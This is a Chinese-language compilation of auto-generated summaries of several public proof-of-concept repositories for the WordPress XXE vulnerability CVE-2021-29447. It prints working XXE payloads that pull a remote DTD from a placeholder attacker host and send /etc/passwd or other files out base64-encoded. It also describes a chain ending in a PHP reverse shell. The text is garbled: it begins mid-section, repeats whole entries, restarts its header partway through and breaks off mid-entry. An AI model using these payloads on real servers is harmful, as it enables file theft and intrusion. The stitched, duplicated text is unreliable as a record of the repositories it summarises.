CVE-2021-29447 漏洞存在于 WordPress 的媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限的用户（例如作者）可以通过上传包含恶意 XML 内容的文件（如特制的 WAV 文件）来触发 XXE 漏洞。

**利用方式：**

1.  **构建恶意 WAV 文件：** 攻击者需要创建一个包含恶意 XML 声明的 WAV 文件。该 XML 声明包含一个外部实体引用，指向攻击者控制的远程 DTD 文件。

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
        <!ENTITY % remote SYSTEM 'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'>
        %remote;%init;%trick;
    ]>
    ```

2.  **创建恶意 DTD 文件：** 攻击者需要在自己的服务器上创建一个 DTD 文件，该文件定义了如何读取服务器上的文件，并将其发送回攻击者。例如，读取 `/etc/passwd` 文件并进行 Base64 编码。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

    或者，读取 WordPress 配置文件 `index.php`。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../index.php">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

3.  **上传恶意 WAV 文件：** 攻击者通过 WordPress 后台的媒体库上传该恶意 WAV 文件。

4.  **触发 XXE：** WordPress 解析该 WAV 文件时，会尝试解析其中的 XML 内容，从而触发 XXE 漏洞，并从攻击者的服务器下载 DTD 文件。

5.  **获取文件内容：** 恶意 DTD 文件会指示 WordPress 读取目标文件（例如 `/etc/passwd` 或 `wp-config.php`），对其进行 Base64 编码，并通过 HTTP 请求将内容发送到攻击者的服务器。

**有效性：**

提供的 POC 代码有效，可以利用该漏洞读取服务器上的文件，或者进行 SSRF 攻击。搜索结果中的多个链接也证实了该漏洞的存在以及利用方式。

**投毒风险：**

代码中存在轻微的投毒风险。主要的风险点在于 DTD 文件是由攻击者提供的。虽然提供的 DTD 示例代码是用来读取文件，但攻击者可以在 DTD 文件中执行其他恶意操作，例如尝试执行代码。但是由于文件读取已经是该漏洞所能达到的最大危害之一。所以判断投毒风险为10%。该值评估仓库中是否隐藏有恶意或非预期行为的代码。例如，某些代码可能会在未经授权的情况下收集用户信息、安装后门或执行其他恶意活动。 

**项目地址:** [AssassinUKG/CVE-2021-29447](https://github.com/AssassinUKG/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #6

**来源**: [CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md](../2021/CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，并且运行在PHP 8环境下；需要具备上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于WordPress媒体库中，允许具有文件上传权限的用户利用XML解析漏洞执行XXE攻击。漏洞利用需要WordPress运行在PHP 8环境下，因为该漏洞利用了PHP 8中ID3库的一个缺陷。攻击者可以上传包含恶意XML代码的WAV文件，其中XML代码定义了外部实体，导致服务器尝试解析并加载外部资源。利用方式如下：

1.  攻击者准备一个恶意的DTD文件，该文件包含用于读取服务器文件或执行其他操作的实体。
2.  攻击者使用提供的Python脚本 (`evil-wav-dtd-xxe.py`) 生成一个包含指向恶意DTD的XML的WAV文件。 该脚本会创建一个DTD文件，其中包含一个实体来读取目标文件，并创建一个HTTP请求来将读取的文件内容发送到攻击者的服务器。
3.  攻击者通过WordPress媒体库上传生成的恶意WAV文件。
4.  当WordPress解析该WAV文件时，会触发XXE漏洞，导致服务器加载并执行恶意DTD文件中的指令，将目标服务器上的文件内容通过HTTP请求发送给攻击者。

**有效性评估：**

根据漏洞信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码（`evil-wav-dtd-xxe.py`）可以生成恶意的WAV文件和DTD文件，用于利用该漏洞读取服务器上的敏感文件。因此，PoC代码是有效的。

**投毒风险评估：**

查看提供的PoC代码，该代码主要用于生成漏洞利用所需的WAV和DTD文件。 `evil-wav-dtd-xxe.py` 脚本本身的作用就是生成利用漏洞的payload， 从代码逻辑上看，不存在明显的恶意代码或后门。`readme.md` 仅仅是提供使用的说明。

**利用方式总结：**

1.  **权限要求：** 具有上传文件权限的WordPress用户（如Author角色）。
2.  **环境要求：** WordPress版本在5.6.0到5.7.1之间，运行在PHP 8环境下。
3.  **攻击步骤：**
    *   准备恶意DTD文件：该文件定义了读取服务器文件的实体，并将文件内容发送到攻击者控制的服务器。
    *   生成恶意WAV文件：使用`evil-wav-dtd-xxe.py`脚本生成包含指向恶意DTD文件的XML的WAV文件。
    *   上传恶意WAV文件：通过WordPress媒体库上传生成的WAV文件。
    *   触发XXE漏洞：WordPress解析WAV文件时，加载恶意DTD文件，读取服务器文件并通过HTTP请求发送给攻击者。


**项目地址:** [G01d3nW01f/CVE-2021-29447](https://github.com/G01d3nW01f/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #7

**来源**: [CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md](../2021/CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1，运行在PHP 8环境下

**利用条件:** 需要拥有上传文件权限（例如，作者权限），并且服务器运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户通过上传包含恶意XML的音频文件（如WAV或MP3）来触发XXE漏洞。此漏洞要求WordPress运行在PHP 8环境下，因为该版本的PHP中使用的XML解析器存在缺陷。攻击者可以利用此漏洞读取服务器上的敏感文件。PoC利用了本地启动HTTP服务的方式来接收目标服务器发送的文件内容，相对安全。投毒风险极低，主要风险点在脚本第一行的`#!/usr/bin/dev python3`，存在一定的误导性，如果用户直接复制该代码，可能会导致执行失败，但对安全性没有影响。主要功能代码位于`wordpress-cve-2021-29447.py`文件中，实现了漏洞利用的全部流程，包括身份验证、恶意文件上传和文件读取。

**项目地址:** [M3l0nPan/wordpress-cve-2021-29447](https://github.com/M3l0nPan/wordpress-cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #8

**来源**: [CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md](../2021/CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md)

# CVE-2021-29447

> 📦 该CVE有 **19** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md](../2021/CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露，服务器端请求伪造 (SSRF)

**影响版本:** 5.6.0 <= version < 5.7.1 (需要PHP 8环境)

**利用条件:** 需要 WordPress 站点运行在 PHP 8 环境，并具有文件上传权限（例如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 5.6 到 5.7 版本中，且需要运行在 PHP 8 环境下。攻击者需要具备文件上传权限，比如拥有 Author 角色。漏洞原理是 WordPress 在处理上传的媒体文件时，特别是 WAVE 音频文件，其中使用的 ID3 解析库存在 XML 解析问题。攻击者可以构造恶意的 WAVE 文件，其中包含指向外部实体的 XML 代码，从而读取服务器上的任意文件，或进行服务器端请求伪造。

**利用方式:**

1.  攻击者首先需要一个具有文件上传权限的 WordPress 账户（如 Author）。
2.  攻击者构造一个包含恶意 XML 内容的 WAVE 文件（payload.wav）。该 XML 声明了一个外部实体，指向攻击者控制的服务器上的 DTD 文件。
3.  攻击者在自己的服务器上部署一个恶意的 DTD 文件（evil.dtd）。该 DTD 文件定义了另一个实体，用于读取目标服务器上的文件内容，并通过 HTTP 请求将内容发送给攻击者。
4.  攻击者将构造的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  当 WordPress 解析该 WAVE 文件时，会触发 XXE 漏洞，加载攻击者服务器上的 DTD 文件，并读取目标文件内容，将 base64 编码后的内容发送到攻击者的服务器。
6.  攻击者从 HTTP 请求中获取 base64 编码的数据，并进行解码，得到目标文件的内容。

**POC 代码分析:**

提供的 Python 脚本 `PoC.py` 用于自动化生成恶意的 `payload.wav` 和 `evil.dtd` 文件。该脚本需要指定攻击者的服务器 IP 地址、端口，以及要读取的目标文件路径。脚本还会启动一个简单的 PHP HTTP 服务器，用于接收目标服务器发送的请求。

**投毒风险评估:**

代码本身功能明确，就是用于生成payload和启动http server，没有发现任何隐藏的恶意代码或后门。decode.php只是用来解码base64数据，所以判定没有投毒风险。

**项目地址:** [0xRar/CVE-2021-29447-PoC](https://github.com/0xRar/CVE-2021-29447-PoC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #2

**来源**: [CVE-2021-29447-0xricksanchez_CVE-2021-29447.md](../2021/CVE-2021-29447-0xricksanchez_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress Authenticated XXE attack in Media Library

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML External Entity (XXE) Injection

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (需要 PHP 8)

**利用条件:** 需要具有文件上传权限（例如，作者角色），且WordPress运行在PHP 8环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 5.6.0 到 5.7.1 版本之间，允许具有文件上传权限的用户（例如作者）通过媒体库上传包含恶意 XML 内容的文件，从而触发 XXE 攻击。漏洞利用依赖于 WordPress 使用 PHP 8，因为 PHP 8 对 XML 解析的处理方式使得 XXE 攻击成为可能。

**有效性：**
提供的 POC 代码 `expl.py` 针对的是利用 WAV 文件中的 iXML 块进行 XXE 注入。这个POC专门针对 WordPress BookingPress 插件 < 1.0.11，但该漏洞的描述是通用的，只要目标应用解析包含恶意 XML 的 iXML 块，就可能受到攻击。由于CVE-2021-29447描述的场景和POC有一定关联，判断该POC具有一定的有效性，可以尝试在受影响的 WordPress 版本上利用。

**投毒风险：**
代码中存在投毒的风险较低。`expl.py` 脚本的主要功能是生成包含 XXE payload 的恶意 WAV 文件。Payload 从命令行参数获取IP和端口，攻击者需要配置自己的HTTP服务来接收数据。`README.md` 中也描述了整个利用流程，从生成恶意文件到启动 HTTP 服务器再到解码数据。但是如果攻击者没有配置自己的服务器，可能会导致数据泄露到poc作者搭建的服务器。因此推断存在10%的投毒风险。

**利用方式：**
1.  **生成恶意 WAV 文件：** 运行 `expl.py` 脚本，指定攻击者控制的服务器 IP 地址和端口，生成包含 XXE payload 的 `exploit.wav` 文件。
2.  **启动 HTTP 服务器：** 在攻击者服务器上启动一个 HTTP 服务器，用于提供外部实体定义 (DTD)。
3.  **上传恶意文件：** 具有文件上传权限的 WordPress 用户将 `exploit.wav` 文件上传到媒体库。
4.  **触发 XXE：** WordPress 解析上传的 WAV 文件，当解析 iXML 块时，会尝试从攻击者控制的服务器下载 DTD 文件，从而触发 XXE 攻击，导致服务器上的文件被读取并以 Base64 编码的形式发送到攻击者的服务器。
5.  **解码数据：** 攻击者从 HTTP 服务器的日志中获取 Base64 编码的数据，并进行解码，获取被读取的文件内容。

**项目地址:** [0xricksanchez/CVE-2021-29447](https://github.com/0xricksanchez/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #3

**来源**: [CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md](../2021/CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (requires PHP 8)

**利用条件:** 需要 WordPress 运行在 PHP 8 环境，且攻击者需要具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有上传文件权限的用户（例如，作者）通过上传包含恶意 XML 内容的文件（如特制的 WAVE 文件）来执行 XXE 攻击。

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息、搜索引擎结果和 POC 代码的 README.md 文件均描述了该漏洞的利用方式和影响。

**投毒风险分析：**
提供的漏洞利用代码（README.md）主要描述了漏洞的原理、利用方法和修复方案，并未发现明显的恶意代码或后门。其核心步骤包括：

1.  创建一个包含恶意 XML 内容的 WAVE 文件。
2.  搭建一个 HTTP 服务器，用于接收 XXE 攻击泄露的数据。
3.  将恶意 WAVE 文件上传到 WordPress 的媒体库。
4.  从 HTTP 服务器的日志中获取泄露的敏感信息（例如，wp-config.php 中的数据库凭据）。

虽然代码本身没有直接的投毒行为，但攻击者可能利用泄露的数据库凭据进一步入侵系统。因此，投毒风险较低，估计为 5%。

**利用方式分析：**
该漏洞的利用方式主要分为以下几个步骤：

1.  **权限获取：** 攻击者需要具备 WordPress 中上传文件的权限（如 Author 角色）。
2.  **恶意文件制作：** 攻击者需要构造一个恶意的 WAVE 文件，该文件包含指向外部实体的 XML 内容，用于触发 XXE 漏洞。DTD文件包含需要泄露的文件路径，例如 wp-config.php。
3.  **HTTP服务器搭建：** 攻击者需要搭建一个 HTTP 服务器，用于接收来自 WordPress 服务器的请求，这些请求包含通过 XXE 漏洞泄露的敏感信息。Zlib解码用于有效的提取数据
4.  **文件上传：** 攻击者将制作好的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  **信息泄露：** 当 WordPress 解析上传的 WAVE 文件时，会触发 XXE 漏洞，导致服务器向攻击者的 HTTP 服务器发送包含敏感信息的请求。
6.  **数据提取：** 攻击者从 HTTP 服务器的日志中提取泄露的敏感信息，例如 wp-config.php 文件中的数据库凭据。
7.  **后续利用：** 攻击者可以利用泄露的数据库凭据登录数据库，并进一步获取管理员权限，甚至控制整个 WordPress 网站。

**项目地址:** [Abdulazizalsewedy/CVE-2021-29447](https://github.com/Abdulazizalsewedy/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #4

**来源**: [CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md](../2021/CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md)

## CVE-2021-29447 WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露，包括数据库凭据，并最终导致远程代码执行

**影响版本:** >= 5.6.0, < 5.7.1，需要PHP 8

**利用条件:** 需要具备上传文件的权限 (如 Author 角色)，服务器运行PHP 8，存在可利用的端口（如80,443,22,3306）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

提供的漏洞利用代码展示了完整的攻击链，从信息收集到获取反向shell。漏洞CVE-2021-29447是WordPress媒体库中的XXE漏洞，该漏洞允许攻击者通过上传特制的恶意WAV文件读取服务器上的敏感文件，比如wp-config.php。漏洞利用过程如下：

1. **侦察和枚举：** 使用Nmap扫描目标主机，发现开放端口和服务版本。使用WPScan枚举用户名，并通过暴力破解获取有效凭据。
2. **XXE 漏洞利用：**  构造包含恶意XML内容的WAV文件，利用XML外部实体注入读取wp-config.php文件。需要搭建一个HTTP服务器来接收和处理泄露的数据。使用php脚本解码base64编码的数据，提取数据库凭据。
3. **数据库访问：** 使用获得的数据库凭据连接到MySQL数据库，提取用户表中的用户名和密码哈希。
4. **密码破解：** 使用John the Ripper破解用户密码哈希，获取明文密码。
5. **权限提升和远程代码执行：** 修改Hello Dolly插件，插入PHP反向shell代码。通过访问修改后的插件页面，触发反向shell连接到攻击者控制的机器。
6. **后渗透：**  在获取shell后，执行提权操作，查找敏感文件。

**关于投毒风险的分析:**

POC代码中包含完整的攻击链，本身并没有明显的投毒代码，但如果使用者不熟悉整个流程，直接复制粘贴执行，可能会留下后门，例如植入的PHP反向shell。此外，攻击者可能将接收泄露数据的 HTTP server  替换成一个恶意站点，窃取攻击者的信息。因此，判定存在一定概率的投毒风险，估计为10%。主要风险点在于使用者对代码理解程度不够，可能直接使用未经验证的代码。


**项目地址:** [ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-](https://github.com/ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #5

**来源**: [CVE-2021-29447-AssassinUKG_CVE-2021-29447.md](../2021/CVE-2021-29447-AssassinUKG_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露和服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (在 PHP 8 环境下)

**利用条件:** 需要具备上传文件的权限 (如作者角色)，且服务器运行在 PHP 8 环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 的媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限的用户（例如作者）可以通过上传包含恶意 XML 内容的文件（如特制的 WAV 文件）来触发 XXE 漏洞。

**利用方式：**

1.  **构建恶意 WAV 文件：** 攻击者需要创建一个包含恶意 XML 声明的 WAV 文件。该 XML 声明包含一个外部实体引用，指向攻击者控制的远程 DTD 文件。

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
        <!ENTITY % remote SYSTEM 'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'>
        %remote;%init;%trick;
    ]>
    ```

2.  **创建恶意 DTD 文件：** 攻击者需要在自己的服务器上创建一个 DTD 文件，该文件定义了如何读取服务器上的文件，并将其发送回攻击者。例如，读取 `/etc/passwd` 文件并进行 Base64 编码。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

    或者，读取 WordPress 配置文件 `index.php`。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../index.php">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

3.  **上传恶意 WAV 文件：** 攻击者通过 WordPress 后台的媒体库上传该恶意 WAV 文件。

4.  **触发 XXE：** WordPress 解析该 WAV 文件时，会尝试解析其中的 XML 内容，从而触发 XXE 漏洞，并从攻击者的服务器下载 DTD 文件。

5.  **获取文件内容：** 恶意 DTD 文件会指示 WordPress 读取目标文件（例如 `/etc/passwd` 或 `wp-config.php`），对其进行 Base64 编码，并通过 HTTP 请求将内容发送到攻击者的服务器。

**有效性：**

提供的 POC 代码有效，可以利用该漏洞读取服务器上的文件，或者进行 SSRF 攻击。搜索结果中的多个链接也证实了该漏洞的存在以及利用方式。

**投毒风险：**

代码中存在轻微的投毒风险。主要的风险点在于 DTD 文件是由攻击者提供的。虽然提供的 DTD 示例代码是用来读取文件，但攻击者可以在 DTD 文件中执行其他恶意操作，例如尝试执行代码。但是由于文件读取已经是该漏洞所能达到的最大危害之一。所以判断投毒风险为10%。该值评估仓库中是否隐藏有恶意或非预期行为的代码。例如，某些代码可能会在未经授权的情况下收集用户信息、安装后门或执行其他恶意活动。 

**项目地址:** [AssassinUKG/CVE-2021-29447](https://github.com/AssassinUKG/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #6

**来源**: [CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md](../2021/CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，并且运行在PHP 8环境下；需要具备上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于WordPress媒体库中，允许具有文件上传权限的用户利用XML解析漏洞执行XXE攻击。漏洞利用需要WordPress运行在PHP 8环境下，因为该漏洞利用了PHP 8中ID3库的一个缺陷。攻击者可以上传包含恶意XML代码的WAV文件，其中XML代码定义了外部实体，导致服务器尝试解析并加载外部资源。利用方式如下：

1.  攻击者准备一个恶意的DTD文件，该文件包含用于读取服务器文件或执行其他操作的实体。
2.  攻击者使用提供的Python脚本 (`evil-wav-dtd-xxe.py`) 生成一个包含指向恶意DTD的XML的WAV文件。 该脚本会创建一个DTD文件，其中包含一个实体来读取目标文件，并创建一个HTTP请求来将读取的文件内容发送到攻击者的服务器。
3.  攻击者通过WordPress媒体库上传生成的恶意WAV文件。
4.  当WordPress解析该WAV文件时，会触发XXE漏洞，导致服务器加载并执行恶意DTD文件中的指令，将目标服务器上的文件内容通过HTTP请求发送给攻击者。

**有效性评估：**

根据漏洞信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码（`evil-wav-dtd-xxe.py`）可以生成恶意的WAV文件和DTD文件，用于利用该漏洞读取服务器上的敏感文件。因此，PoC代码是有效的。

**投毒风险评估：**

查看提供的PoC代码，该代码主要用于生成漏洞利用所需的WAV和DTD文件。 `evil-wav-dtd-xxe.py` 脚本本身的作用就是生成利用漏洞的payload， 从代码逻辑上看，不存在明显的恶意代码或后门。`readme.md` 仅仅是提供使用的说明。

**利用方式总结：**

1.  **权限要求：** 具有上传文件权限的WordPress用户（如Author角色）。
2.  **环境要求：** WordPress版本在5.6.0到5.7.1之间，运行在PHP 8环境下。
3.  **攻击步骤：**
    *   准备恶意DTD文件：该文件定义了读取服务器文件的实体，并将文件内容发送到攻击者控制的服务器。
    *   生成恶意WAV文件：使用`evil-wav-dtd-xxe.py`脚本生成包含指向恶意DTD文件的XML的WAV文件。
    *   上传恶意WAV文件：通过WordPress媒体库上传生成的WAV文件。
    *   触发XXE漏洞：WordPress解析WAV文件时，加载恶意DTD文件，读取服务器文件并通过HTTP请求发送给攻击者。


**项目地址:** [G01d3nW01f/CVE-2021-29447](https://github.com/G01d3nW01f/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #7

**来源**: [CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md](../2021/CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1，运行在PHP 8环境下

**利用条件:** 需要拥有上传文件权限（例如，作者权限），并且服务器运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户通过上传包含恶意XML的音频文件（如WAV或MP3）来触发XXE漏洞。此漏洞要求WordPress运行在PHP 8环境下，因为该版本的PHP中使用的XML解析器存在缺陷。攻击者可以利用此漏洞读取服务器上的敏感文件。PoC利用了本地启动HTTP服务的方式来接收目标服务器发送的文件内容，相对安全。投毒风险极低，主要风险点在脚本第一行的`#!/usr/bin/dev python3`，存在一定的误导性，如果用户直接复制该代码，可能会导致执行失败，但对安全性没有影响。主要功能代码位于`wordpress-cve-2021-29447.py`文件中，实现了漏洞利用的全部流程，包括身份验证、恶意文件上传和文件读取。

**项目地址:** [M3l0nPan/wordpress-cve-2021-29447](https://github.com/M3l0nPan/wordpress-cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #8

**来源**: [CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md](../2021/CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md)

# CVE-2021-29447

> 📦 该CVE有 **19** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md](../2021/CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露，服务器端请求伪造 (SSRF)

**影响版本:** 5.6.0 <= version < 5.7.1 (需要PHP 8环境)

**利用条件:** 需要 WordPress 站点运行在 PHP 8 环境，并具有文件上传权限（例如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 5.6 到 5.7 版本中，且需要运行在 PHP 8 环境下。攻击者需要具备文件上传权限，比如拥有 Author 角色。漏洞原理是 WordPress 在处理上传的媒体文件时，特别是 WAVE 音频文件，其中使用的 ID3 解析库存在 XML 解析问题。攻击者可以构造恶意的 WAVE 文件，其中包含指向外部实体的 XML 代码，从而读取服务器上的任意文件，或进行服务器端请求伪造。

**利用方式:**

1.  攻击者首先需要一个具有文件上传权限的 WordPress 账户（如 Author）。
2.  攻击者构造一个包含恶意 XML 内容的 WAVE 文件（payload.wav）。该 XML 声明了一个外部实体，指向攻击者控制的服务器上的 DTD 文件。
3.  攻击者在自己的服务器上部署一个恶意的 DTD 文件（evil.dtd）。该 DTD 文件定义了另一个实体，用于读取目标服务器上的文件内容，并通过 HTTP 请求将内容发送给攻击者。
4.  攻击者将构造的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  当 WordPress 解析该 WAVE 文件时，会触发 XXE 漏洞，加载攻击者服务器上的 DTD 文件，并读取目标文件内容，将 base64 编码后的内容发送到攻击者的服务器。
6.  攻击者从 HTTP 请求中获取 base64 编码的数据，并进行解码，得到目标文件的内容。

**POC 代码分析:**

提供的 Python 脚本 `PoC.py` 用于自动化生成恶意的 `payload.wav` 和 `evil.dtd` 文件。该脚本需要指定攻击者的服务器 IP 地址、端口，以及要读取的目标文件路径。脚本还会启动一个简单的 PHP HTTP 服务器，用于接收目标服务器发送的请求。

**投毒风险评估:**

代码本身功能明确，就是用于生成payload和启动http server，没有发现任何隐藏的恶意代码或后门。decode.php只是用来解码base64数据，所以判定没有投毒风险。

**项目地址:** [0xRar/CVE-2021-29447-PoC](https://github.com/0xRar/CVE-2021-29447-PoC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #2

**来源**: [CVE-2021-29447-0xricksanchez_CVE-2021-29447.md](../2021/CVE-2021-29447-0xricksanchez_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress Authenticated XXE attack in Media Library

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML External Entity (XXE) Injection

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (需要 PHP 8)

**利用条件:** 需要具有文件上传权限（例如，作者角色），且WordPress运行在PHP 8环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 5.6.0 到 5.7.1 版本之间，允许具有文件上传权限的用户（例如作者）通过媒体库上传包含恶意 XML 内容的文件，从而触发 XXE 攻击。漏洞利用依赖于 WordPress 使用 PHP 8，因为 PHP 8 对 XML 解析的处理方式使得 XXE 攻击成为可能。

**有效性：**
提供的 POC 代码 `expl.py` 针对的是利用 WAV 文件中的 iXML 块进行 XXE 注入。这个POC专门针对 WordPress BookingPress 插件 < 1.0.11，但该漏洞的描述是通用的，只要目标应用解析包含恶意 XML 的 iXML 块，就可能受到攻击。由于CVE-2021-29447描述的场景和POC有一定关联，判断该POC具有一定的有效性，可以尝试在受影响的 WordPress 版本上利用。

**投毒风险：**
